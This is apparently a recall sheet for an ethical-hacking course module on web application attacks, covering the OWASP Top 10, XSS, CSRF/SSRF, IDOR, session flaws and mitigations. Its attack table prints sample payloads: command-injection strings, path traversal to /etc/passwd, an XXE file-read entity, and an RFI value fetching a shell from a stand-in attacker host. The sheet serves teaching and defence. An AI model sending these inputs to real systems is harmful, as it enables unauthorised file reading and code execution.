# Module 14 — Hacking Web Applications · Must-Know Facts

> One-page, high-yield recall sheet. If you can reproduce this from memory, you own the module. Pairs with [README.md](README.md) · [practice-questions.md](practice-questions.md) · [flashcards.csv](flashcards.csv) · [lab-walkthrough.md](lab-walkthrough.md).

## The web-app hacking methodology (in order)
**Footprint → Analyze the web app → Attack the surface.**
- **Footprint:** fingerprint the tech stack, discover directories, endpoints, and APIs.
- **Analyze:** map every input — parameters, headers, cookies, hidden fields, JSON bodies.
- **Attack surface:** authentication, session management, access control, input validation, business logic, and web services / APIs.

This module targets **your application code**; Module 13 targets the **web server / platform**. **SQL injection is large enough to have its own module — see [Module 15](../15-sql-injection/README.md).**

## OWASP Top 10 (2021) — memorize the list
| # | Category | Remember |
|---|---|---|
| A01 | **Broken Access Control** | Includes **IDOR**; the #1 category |
| A02 | Cryptographic Failures | Weak/missing crypto, cleartext secrets |
| A03 | **Injection** | SQLi, command injection, **XSS lives here** |
| A04 | Insecure Design | Missing security by design |
| A05 | Security Misconfiguration | Defaults, verbose errors, **XXE** commonly here |
| A06 | Vulnerable & Outdated Components | Known-CVE libraries |
| A07 | Identification & Authentication Failures | Broken auth, weak sessions |
| A08 | Software & Data Integrity Failures | **Insecure deserialization** |
| A09 | Security Logging & Monitoring Failures | Can't detect the breach |
| A10 | **Server-Side Request Forgery (SSRF)** | Its own 2021 category |

## XSS — three flavors (know where the payload lives)
| Type | Where the payload lives | Trigger |
|---|---|---|
| **Stored (persistent)** | Saved server-side (DB, comment, profile) | Runs for **every** viewer |
| **Reflected (non-persistent)** | Echoed straight back from the request | Victim **clicks a crafted link** |
| **DOM-based** | Never leaves the browser; client JS reads attacker-controlled DOM | Client-side sink (`innerHTML`, `eval`, `document.write`) |

XSS = **run script in the victim's browser** → steal cookies/session, keylog, pivot. **Fix = context-aware output encoding + CSP**, plus `HttpOnly` / `SameSite` cookies — **not input filtering alone.**

## CSRF vs. SSRF — the classic trap
| | **CSRF** | **SSRF** |
|---|---|---|
| Who is tricked | The **victim's browser** | The **server** |
| Direction | Forces the *user* to submit a state-changing action | Forces the *server* to make a request |
| Typical target | Change email/password, transfer funds | Internal services, cloud metadata `169.254.169.254` |
| Fix | Anti-CSRF tokens, `SameSite` cookies | Egress allow-list, block link-local/internal IPs, IMDSv2 |

**Mnemonic:** CSRF tricks the **client/browser**; SSRF tricks the **server**. If the forged request hits internal infra or cloud metadata, it's **SSRF**.

## Access control / IDOR
Changing `?account_id=1001` to `1002` and seeing another user's data = **IDOR (Insecure Direct Object Reference)** = **Broken Access Control (A01)**. It is an **authorization** bug, **not** an input-validation bug. Fix = **server-side, per-object authorization checks, deny-by-default.**

## Input-handling attacks quick map
| Attack | Payload idea | Impact |
|---|---|---|
| **Command injection** | `; whoami` / `\| id` in a param passed to a shell | RCE |
| **LFI** (local file inclusion) | `?page=../../../../etc/passwd` | Read local files; log-poison → RCE |
| **RFI** (remote file inclusion) | `?page=http://attacker/shell.txt` | Remote code inclusion (needs `allow_url_include`) |
| **Directory traversal** | `../` sequences | Escape the web root, read arbitrary files |
| **Unrestricted file upload** | Upload `shell.php` → browse to it | **Web shell → RCE** |
| **XXE** (XML external entity) | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | File read, SSRF, DoS |
| **Insecure deserialization** | Crafted serialized object | RCE / logic abuse |

**LFI vs RFI:** LFI reads a **local** file; RFI pulls a **remote** file. RFI usually needs `allow_url_include=On` and is rarer in modern PHP.

## Broken authentication & session management
- **Session fixation:** attacker sets/knows the victim's session ID before login, then rides it after.
- **Session prediction:** weak, guessable session tokens.
- **Token leakage:** session IDs in URLs, logs, or Referer headers.
- Fixes: rotate the session ID **on login**, `HttpOnly` + `Secure` + `SameSite`, short expiry, invalidate on logout, and **MFA**.

## Burp / ZAP workflow (the core loop)
**Point the browser at an intercepting proxy → capture the request → send to Repeater → tamper one parameter at a time → observe the response.**
- **Burp Suite:** Proxy, Repeater, Intruder, Scanner.
- **OWASP ZAP:** open-source proxy + spider + active scanner.
- Automation (sqlmap, commix, the scanner) **confirms**; the proxy is where you **understand**. Change **one variable at a time.**

## The one-line PAM answer key
- **Hardcoded DB/API creds in app config** → remove the static secret; deliver at runtime via **CyberArk CCP / Conjur**, rotate with **CPM**.
- **SSRF → metadata/secret theft** → keep secrets off the instance (Conjur) + **IMDSv2**; block the metadata endpoint.
- **Web shell / LFI finds credentials** → **run the app as a least-privilege service account** with no local admin and no reusable domain creds, so a shell inherits nothing useful.
- **Theft of a privileged web/admin console session** → **CyberArk Secure Web Sessions** (record + isolate + protect the session).
- **Over-privileged app identity** → least-privilege app account + rotate its secrets (CPM).

## Top traps
- **CSRF tricks the browser; SSRF tricks the server.** Internal/metadata target ⇒ SSRF.
- **Stored XSS** hits every viewer; **reflected XSS** needs a click; **DOM XSS** never touches the server.
- **IDOR = Broken Access Control (A01)** — an *authorization* bug, not an input bug.
- **Input filtering alone does not fix XSS** — you need **context-aware output encoding + CSP**.
- **LFI = local file**; **RFI = remote file** (RFI needs `allow_url_include`).
- **XSS lives under A03 Injection**; **SSRF is its own category A10** — don't merge them.
- **Insecure deserialization = A08**; **XXE** is typically **A05 Security Misconfiguration**.
- **SQL injection is Module 15**, not this one — but it is still A03 Injection.
